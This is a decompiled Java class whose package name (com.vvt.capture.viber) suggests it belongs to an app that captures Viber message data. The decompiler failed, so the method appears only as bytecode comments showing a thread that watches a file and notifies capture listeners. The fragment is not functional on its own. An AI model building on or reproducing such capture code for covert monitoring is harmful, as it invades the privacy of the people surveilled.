package com.vvt.capture.viber.mode.full;

class h
  implements Runnable
{
  h(g paramg) {}
  
  /* Error */
  public void run()
  {
    // Byte code:
    //   0: ldc2_w 15
    //   3: lstore_1
    //   4: lload_1
    //   5: invokestatic 24	android/os/SystemClock:sleep	(J)V
    //   8: aload_0
    //   9: getfield 10	com/vvt/capture/viber/mode/full/AppEngine1:a	Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;
    //   12: astore_3
    //   13: new 26	java/io/File
    //   16: astore 4
    //   18: aload_0
    //   19: getfield 10	com/vvt/capture/viber/mode/full/AppEngine1:a	Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;
    //   22: astore 5
    //   24: aload 5
    //   26: invokestatic 31	com/vvt/capture/viber/mode/full/FxFileObserverWorker:a	(Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;)Ljava/lang/String;
    //   29: astore 5
    //   31: aload 4
    //   33: aload 5
    //   35: invokespecial 34	java/io/File:<init>	(Ljava/lang/String;)V
    //   38: aload_3
    //   39: aload 4
    //   41: invokestatic 37	com/vvt/capture/viber/mode/full/FxFileObserverWorker:a	(Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;Ljava/io/File;)Ljava/io/File;
    //   44: pop
    //   45: aload_0
    //   46: getfield 10	com/vvt/capture/viber/mode/full/AppEngine1:a	Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;
    //   49: astore_3
    //   50: aload_3
    //   51: getfield 40	com/vvt/capture/viber/mode/full/FxFileObserverWorker:a	Lcom/vvt/capture/viber/mode/full/f;
    //   54: astore_3
    //   55: aload_3
    //   56: invokestatic 45	com/vvt/capture/viber/mode/full/f:a	(Lcom/vvt/capture/viber/mode/full/f;)Z
    //   59: istore 6
    //   61: iload 6
    //   63: ifeq +142 -> 205
    //   66: aload_0
    //   67: getfield 10	com/vvt/capture/viber/mode/full/AppEngine1:a	Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;
    //   70: astore_3
    //   71: aload_3
    //   72: invokestatic 49	com/vvt/capture/viber/mode/full/FxFileObserverWorker:removeFromPath	(Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;)Ljava/io/File;
    //   75: astore_3
    //   76: aload_3
    //   77: invokevirtual 53	java/io/File:exists	()Z
    //   80: istore 6
    //   82: iload 6
    //   84: ifeq +121 -> 205
    //   87: invokestatic 55	com/vvt/capture/viber/mode/full/f:removeFromPath	()Z
    //   90: istore 6
    //   92: iload 6
    //   94: ifeq +3 -> 97
    //   97: aload_0
    //   98: getfield 10	com/vvt/capture/viber/mode/full/AppEngine1:a	Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;
    //   101: astore_3
    //   102: aload_3
    //   103: getfield 40	com/vvt/capture/viber/mode/full/FxFileObserverWorker:a	Lcom/vvt/capture/viber/mode/full/f;
    //   106: astore_3
    //   107: aload_3
    //   108: invokestatic 58	com/vvt/capture/viber/mode/full/f:removeFromPath	(Lcom/vvt/capture/viber/mode/full/f;)Ljava/util/HashSet;
    //   111: astore 4
    //   113: aload 4
    //   115: monitorenter
    //   116: aload_0
    //   117: getfield 10	com/vvt/capture/viber/mode/full/AppEngine1:a	Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;
    //   120: astore_3
    //   121: aload_3
    //   122: getfield 40	com/vvt/capture/viber/mode/full/FxFileObserverWorker:a	Lcom/vvt/capture/viber/mode/full/f;
    //   125: astore_3
    //   126: aload_3
    //   127: invokestatic 58	com/vvt/capture/viber/mode/full/f:removeFromPath	(Lcom/vvt/capture/viber/mode/full/f;)Ljava/util/HashSet;
    //   130: astore_3
    //   131: aload_3
    //   132: invokevirtual 64	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   135: astore 5
    //   137: aload 5
    //   139: invokeinterface 69 1 0
    //   144: istore 6
    //   146: iload 6
    //   148: ifeq +54 -> 202
    //   151: aload 5
    //   153: invokeinterface 73 1 0
    //   158: astore_3
    //   159: aload_3
    //   160: checkcast 75	com/vvt/base/capture/i
    //   163: astore_3
    //   164: aload_3
    //   165: invokeinterface 77 1 0
    //   170: goto -33 -> 137
    //   173: astore_3
    //   174: aload 4
    //   176: monitorexit
    //   177: aload_3
    //   178: athrow
    //   179: astore_3
    //   180: invokestatic 80	com/vvt/capture/viber/mode/full/f:MyUncaughtExceptionHandler	()Z
    //   183: istore 6
    //   185: iload 6
    //   187: ifeq +3 -> 190
    //   190: aload_0
    //   191: getfield 10	com/vvt/capture/viber/mode/full/AppEngine1:a	Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;
    //   194: astore_3
    //   195: aload_3
    //   196: aconst_null
    //   197: invokestatic 83	com/vvt/capture/viber/mode/full/FxFileObserverWorker:a	(Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;Ljava/lang/Thread;)Ljava/lang/Thread;
    //   200: pop
    //   201: return
    //   202: aload 4
    //   204: monitorexit
    //   205: aload_0
    //   206: getfield 10	com/vvt/capture/viber/mode/full/AppEngine1:a	Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;
    //   209: astore_3
    //   210: goto -15 -> 195
    //   213: astore_3
    //   214: aload_0
    //   215: getfield 10	com/vvt/capture/viber/mode/full/AppEngine1:a	Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;
    //   218: aconst_null
    //   219: invokestatic 83	com/vvt/capture/viber/mode/full/FxFileObserverWorker:a	(Lcom/vvt/capture/viber/mode/full/FxFileObserverWorker;Ljava/lang/Thread;)Ljava/lang/Thread;
    //   222: pop
    //   223: aload_3
    //   224: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	225	0	this	AppEngine1
    //   3	2	1	l	long
    //   12	153	3	localObject1	Object
    //   173	5	3	localObject2	Object
    //   179	1	3	localException	Exception
    //   194	16	3	localg	FxFileObserverWorker
    //   213	11	3	localObject3	Object
    //   22	130	5	localObject5	Object
    //   59	127	6	bool	boolean
    // Exception table:
    //   from	to	target	type
    //   116	120	173	finally
    //   121	125	173	finally
    //   126	130	173	finally
    //   131	135	173	finally
    //   137	144	173	finally
    //   151	158	173	finally
    //   159	163	173	finally
    //   164	170	173	finally
    //   174	177	173	finally
    //   202	205	173	finally
    //   8	12	179	java/lang/Exception
    //   13	16	179	java/lang/Exception
    //   18	22	179	java/lang/Exception
    //   24	29	179	java/lang/Exception
    //   33	38	179	java/lang/Exception
    //   39	45	179	java/lang/Exception
    //   45	49	179	java/lang/Exception
    //   50	54	179	java/lang/Exception
    //   55	59	179	java/lang/Exception
    //   66	70	179	java/lang/Exception
    //   71	75	179	java/lang/Exception
    //   76	80	179	java/lang/Exception
    //   87	90	179	java/lang/Exception
    //   97	101	179	java/lang/Exception
    //   102	106	179	java/lang/Exception
    //   107	111	179	java/lang/Exception
    //   113	116	179	java/lang/Exception
    //   177	179	179	java/lang/Exception
    //   8	12	213	finally
    //   13	16	213	finally
    //   18	22	213	finally
    //   24	29	213	finally
    //   33	38	213	finally
    //   39	45	213	finally
    //   45	49	213	finally
    //   50	54	213	finally
    //   55	59	213	finally
    //   66	70	213	finally
    //   71	75	213	finally
    //   76	80	213	finally
    //   87	90	213	finally
    //   97	101	213	finally
    //   102	106	213	finally
    //   107	111	213	finally
    //   113	116	213	finally
    //   177	179	213	finally
    //   180	183	213	finally
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/mode/full/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */